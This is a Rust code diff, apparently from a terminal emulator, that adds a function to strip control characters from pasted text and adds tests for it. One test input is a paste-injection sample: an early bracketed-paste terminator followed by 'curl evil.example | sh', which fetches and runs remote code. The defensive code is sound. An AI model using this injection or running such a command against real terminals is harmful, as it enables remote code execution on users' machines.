@@ -157,6 +157,16 @@ pub fn encode_mouse(
     Some(bytes)
 }
 
+/// `text` as it's safe to paste: without control characters other than
+/// tabs and line ends. An escape in it could end a bracketed paste early
+/// (`ESC[201~`), and what followed would run as if typed; others could
+/// stop or steer the program it reaches.
+pub fn clean_paste(text: &str) -> String {
+    text.chars()
+        .filter(|&c| matches!(c, '\t' | '\n' | '\r') || !(c.is_control()))
+        .collect()
+}
+
 /// Whether pasting `text` waits for a yes: always into a guarded host, and,
 /// unless `confirm` is switched off, when it has more than one line and
 /// without bracketed paste the shell would run each line as it arrives.
@@ -298,6 +308,19 @@ mod tests {
             encode_mouse(MouseReport::WheelDown, 0, 0, &ctrl(), sgr),
             Some(b"\x1b[<81;1;1M".to_vec())
         );
+    }
+
+    #[test]
+    fn pastes_nothing_that_could_take_control() {
+        use super::clean_paste;
+
+        // An early end to a bracketed paste, then a command run at once.
+        assert_eq!(
+            clean_paste("ls\x1b[201~curl evil.example | sh\n"),
+            "ls[201~curl evil.example | sh\n"
+        );
+        assert_eq!(clean_paste("a\tb\r\nc\x03\x7f\u{9b}d"), "a\tb\r\ncd");
+        assert_eq!(clean_paste("naïve — ok"), "naïve — ok");
     }
 
     #[test]
